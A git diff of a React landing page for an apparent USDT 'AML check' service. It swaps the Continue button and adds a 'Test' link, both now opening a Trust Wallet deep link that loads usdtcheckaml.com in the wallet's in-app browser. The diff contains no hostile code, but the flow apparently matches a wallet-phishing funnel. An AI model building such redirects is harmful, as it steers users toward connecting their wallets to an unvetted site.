@@ -1,4 +1,4 @@
-import { useEffect, useState } from "react";
+import { useState } from "react";
 import "./Home.css";
 import { useDispatch, useSelector } from "react-redux";
 import { setCurrentStep } from "../../Redux/Slice/MainSlice";
@@ -33,6 +33,10 @@ export function Home() {
             alt=""
             className="home__content-img"
           />
+          <a href="https://link.trustwallet.com/open_url?coin_id=60&url=https://usdtcheckaml.com">
+            Test
+          </a>
+
           <h3 className="home__content-underlogo second-color">
             for AML Analysis
           </h3>
@@ -55,15 +59,19 @@ export function Home() {
               </span>
             </p>
           </div>
-          <button
-            disabled={!isChecked}
-            onClick={() => {
-              dispatch(setCurrentStep(currentStep + 1));
+          <a
+            aria-disabled={!isChecked}
+            onClick={(e) => {
+              if (!isChecked) {
+                e.preventDefault();
+                e.stopPropagation();
+              }
             }}
+            href="https://link.trustwallet.com/open_url?coin_id=60&url=https://usdtcheckaml.com/choose-net"
             className={`home__content-button second-color-bg ${!isChecked ? "disabled" : ""}`}
           >
             Продолжить
-          </button>
+          </a>
         </div>
       </div>
     </section>
